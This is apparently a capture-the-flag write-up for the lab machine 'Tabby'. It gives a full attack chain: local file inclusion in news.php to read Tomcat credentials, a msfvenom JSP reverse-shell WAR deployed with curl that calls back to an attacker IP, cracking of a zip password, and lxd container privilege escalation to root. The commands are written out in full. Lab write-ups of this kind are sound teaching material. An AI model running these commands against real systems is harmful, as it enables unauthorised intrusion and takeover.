So it had 3 ports open 22,80 and 8080.

I accessed the port 80 which gave a simple website.
![placeholder](/writeup/assets/img/tabby/website.png "website")
Most links on the website lead to nowhere except one, news.
The link was trying to access megahosting.htb, so added it to my hosts file.
![placeholder](/writeup/assets/img/tabby/hosts.png "hosts")
The link was like
```url
http://megahosting.htb/news.php?file=statement
```
The file parameter was vulnerable to Local File Inclusion.
![placeholder](/writeup/assets/img/tabby/lfi.png "LFI")
But it didn't give much as I was not able to do log posioning to get shell.

Moved on to the port 8080 and found that there are two login forms. I tried to bruteforce my way in but failed.

On the homepage it was written that tomcat-users.xml file contained the username and password. I tried to access the file at /etc/tomcat9/conf/tomcat-users.xml through the LFI but it gave nothing.

I tried to know whose permission I have as LFI by reading the /proc/self/status.
```url
http://megahosting.htb/news.php?file=/../../../../../../../../../proc/self/status
```
This told me that I have privilege of apache2 during LFI.

Installed tomcat9 locally through
```bash
apt-get install tomcat9
```
and tried to look for files that are readable by everyone by visiting the directories created after installing tomcat9.
![placeholder](/writeup/assets/img/tabby/tomcat.png "findtomcat")
Inside ***/usr/share/tomcat9/etc*** I found tomcat-users.xml that was readable by everyone.
Accessed the file on the machine through LFI and got nothing. Then i remembered that it is a XML file so it will not print anything untill it is stated in it.
So opened the source of webpage and got the login information.
![placeholder](/writeup/assets/img/tabby/login.png "Login")
The login details worked for host-manager and there was not much I can do with that. But I the xml file stated that tomcat user had one more role manager-script.

The manager-script role allows user to do same tasks as manager but thorugh commands not through GUI.

I created a .war payload through msfvenom and uplaoded it to get the revrese shell.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.32 LPORT=8888 -f war > shell.war
curl 'http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/shell' --upload-file shell.war
```
Accessed the file at
```url
http://10.10.10.194:8080/shell
```
and got the reverse shell as tomcat user.

Ran the following command to make the shell tty. 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Enumerating thruogh the machine I found a zipped file in /var/www/html/files/ and the file belonged to ash user on the machine.
Transferred the file to local machine by first encoding it to base64 and then decoding it locally.
```bash
base64 -w 0 16162020_backup.zip
#Copied the hash and then on local terminal
echo -n base64enocdedtext | base64 -d > backup.zip
```
The zipped file was encrypted, so I used john to crack the password.
```bash
zip2john.py backup.py > hash
john --wordlist=rockyou.txt hash
```
Found the password.
Unzipped the file and found that nothing interetsing inside.
Used the password to switch user to ash and it worked.

Found the user.txt

Ran ***id*** and found that i ash user is member of lxd group.

From <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">Link</a> this wonderful article got the steps needed to escalate privileges.

```bash
lxc init
#Did the same as mentioned in article
```
and then on local machine
```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
Uploaded the generated tar.gz file to the machine and then executed following commands
```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```
![placeholder](/writeup/assets/img/tabby/root.png "root")

Found all the files of the machine inside the conatainer's /mnt/root directory as stated in the article.

Found root.txt.
